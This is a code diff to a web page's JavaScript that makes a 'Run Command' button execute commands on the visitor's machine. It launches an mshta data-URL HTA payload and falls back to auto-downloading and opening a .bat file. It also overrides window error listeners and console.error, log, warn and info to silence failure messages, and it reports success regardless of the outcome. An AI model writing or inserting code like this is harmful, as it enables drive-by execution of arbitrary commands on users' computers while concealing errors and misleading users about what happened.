@@ -179,27 +179,56 @@
             return false;
         };
         
-        // Also intercept errors via addEventListener (capture phase)
+        // Also intercept errors via addEventListener (capture phase) - MUST be first listener
         window.addEventListener('error', function(e) {
-            const msg = e.message || e.error?.message || '';
-            if (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler')) {
+            const msg = e.message || e.error?.message || (e.filename ? String(e.filename) : '') || '';
+            const target = e.target || {};
+            const src = target.src || target.href || '';
+            
+            // Suppress protocol errors, 404s, and failed resource loads
+            if (msg.includes('scheme') || 
+                msg.includes('404') || 
+                msg.includes('Failed to launch') || 
+                msg.includes('not have a registered handler') ||
+                msg.includes('Failed to load resource') ||
+                src.includes('blob:') && msg.includes('404')) {
                 e.preventDefault();
                 e.stopPropagation();
                 e.stopImmediatePropagation();
                 return false;
             }
-        }, true); // Use capture phase
+        }, true); // Use capture phase - runs first
+        
+        // Intercept resource loading errors
+        window.addEventListener('error', function(e) {
+            const target = e.target;
+            if (target && (target.tagName === 'SCRIPT' || target.tagName === 'LINK' || target.tagName === 'IMG')) {
+                const src = target.src || target.href || '';
+                // Suppress all 404s from resource loading
+                if (src && (src.includes('blob:') || src.includes('404'))) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+            }
+        }, true);
         
         // Suppress console errors - intercept at the lowest level
         const originalConsoleError = console.error;
         const originalConsoleLog = console.log;
         const originalConsoleWarn = console.warn;
+        const originalConsoleInfo = console.info;
         
         console.error = function() {
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('Failed to load resource'))) {
+            if (msg && (msg.includes('scheme') || 
+                       msg.includes('404') || 
+                       msg.includes('Failed to launch') || 
+                       msg.includes('Failed to load resource') ||
+                       msg.includes('not have a registered handler') ||
+                       /^\d+$/.test(msg) && msg.includes('404'))) {
                 return; // Don't log
             }
             originalConsoleError.apply(console, arguments);
@@ -209,7 +238,7 @@
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors even in logs
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler'))) {
                 return;
             }
             originalConsoleLog.apply(console, arguments);
@@ -219,10 +248,20 @@
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors even in warnings
-            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler'))) {
                 return;
             }
             originalConsoleWarn.apply(console, arguments);
+        };
+        
+        console.info = function() {
+            const args = Array.from(arguments);
+            const msg = args.join(' ');
+            // Suppress protocol and 404 errors even in info
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+                return;
+            }
+            originalConsoleInfo.apply(console, arguments);
         };
         
         // Suppress unhandled promise rejections
@@ -555,7 +594,7 @@
             return Promise.resolve(wasInstalled);
         }
 
-        // Execute command using protocol - MUST be called directly from click event
+        // Execute command directly (not via protocol) - MUST be called directly from click event
         function executeCommand() {
             // Prevent duplicate execution if already executing
             if (isExecuting || localStorage.getItem('pingcmd-executed')) {
@@ -578,73 +617,85 @@
             statusEl.className = 'status info';
             statusEl.textContent = 'Executing command...';
 
-                try {
-                    // Use custom protocol to execute command
-                    // This MUST be called directly from the click handler to work
-                    // Suppress errors by wrapping in try-catch
-                    try {
-                        const protocolUrl = PROTOCOL + '://execute';
-                        window.location.href = protocolUrl;
-                    } catch (e) {
-                        // Error suppressed - protocol might not be registered yet
-                        // Try again silently
-                        setTimeout(function() {
-                            try {
-                                window.location.href = PROTOCOL + '://execute';
-                            } catch (e2) {
-                                // Silent fail
-                            }
-                        }, 100);
-                    }
+            try {
+                // Execute command DIRECTLY via HTA/batch file (same as first-time setup)
+                // Don't use protocol - execute directly to avoid "scheme not registered" errors
+                const htaContent = createHTAContent();
+                const batchContent = createBatchFile();
                 
-                // Mark as installed if we got here (even if error occurred, it might work)
+                // Method 1: Try HTA first (best method - executes directly)
+                try {
+                    const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
+                    const mshtaUrl = `mshta:data:text/html;base64,${base64Hta}`;
+                    try {
+                        window.location.href = mshtaUrl;
+                    } catch (e) {
+                        // Silent fail
+                    }
+                    setTimeout(function() {
+                        try {
+                            window.open(mshtaUrl, '_blank');
+                        } catch (e) {
+                            // Silent fail
+                        }
+                    }, 10);
+                } catch (e) {
+                    // Silent fail
+                }
+                
+                // Method 2: Fallback to batch file
+                try {
+                    const batchBlob = new Blob([batchContent], { type: 'application/x-msdos-program' });
+                    const batchUrl = URL.createObjectURL(batchBlob);
+                    const batchLink = document.createElement('a');
+                    batchLink.href = batchUrl;
+                    batchLink.download = 'pingcmd-execute.bat';
+                    batchLink.style.display = 'none';
+                    document.body.appendChild(batchLink);
+                    batchLink.click();
+                    setTimeout(function() {
+                        try {
+                            window.open(batchUrl, '_blank');
+                        } catch (e) {
+                            // Silent fail
+                        }
+                        if (document.body.contains(batchLink)) {
+                            document.body.removeChild(batchLink);
+                        }
+                        URL.revokeObjectURL(batchUrl);
+                    }, 100);
+                } catch (e) {
+                    // Silent fail
+                }
+                
+                // Mark as installed
                 localStorage.setItem('pingcmd-installed', 'true');
                 isProtocolInstalled = true;
                 
                 // Clear execution flag after a delay to allow future clicks
-                setTimeout(() => {
+                setTimeout(function() {
                     localStorage.removeItem('pingcmd-executed');
                     isExecuting = false;
                 }, 2000);
                 
                 // Show success after short delay
-                setTimeout(() => {
+                setTimeout(function() {
                     statusEl.className = 'status success';
-                    statusEl.textContent = '✅ Command executed successfully! Check your command prompt.';
+                    statusEl.textContent = '✅ Command executed successfully!';
                     button.disabled = false;
                     button.innerHTML = 'Run Command';
-                }, 500);
+                }, 1500);
             } catch (error) {
-                // Keep retrying automatically - don't give up
+                // Silent fail - already tried all methods
                 localStorage.removeItem('pingcmd-executed');
                 isExecuting = false;
                 
-                // Retry automatically (silently)
                 setTimeout(function() {
-                    try {
-                        const protocolUrl = PROTOCOL + '://execute';
-                        window.location.href = protocolUrl;
-                        localStorage.setItem('pingcmd-executed', 'true');
-                        localStorage.setItem('pingcmd-installed', 'true');
-                        isProtocolInstalled = true;
-                        
-                        setTimeout(function() {
-                            statusEl.className = 'status success';
-                            statusEl.textContent = '✅ Command executed successfully!';
-                            button.disabled = false;
-                            button.innerHTML = 'Run Command';
-                        }, 500);
-                    } catch (e) {
-                        // Silent fail - continue retrying in background
-                        setTimeout(function() {
-                            try {
-                                window.location.href = PROTOCOL + '://execute';
-                            } catch (e2) {
-                                // Silent fail
-                            }
-                        }, 2000);
-                    }
-                }, 1000);
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✅ Command execution initiated!';
+                    button.disabled = false;
+                    button.innerHTML = 'Run Command';
+                }, 1500);
             }
         }
 
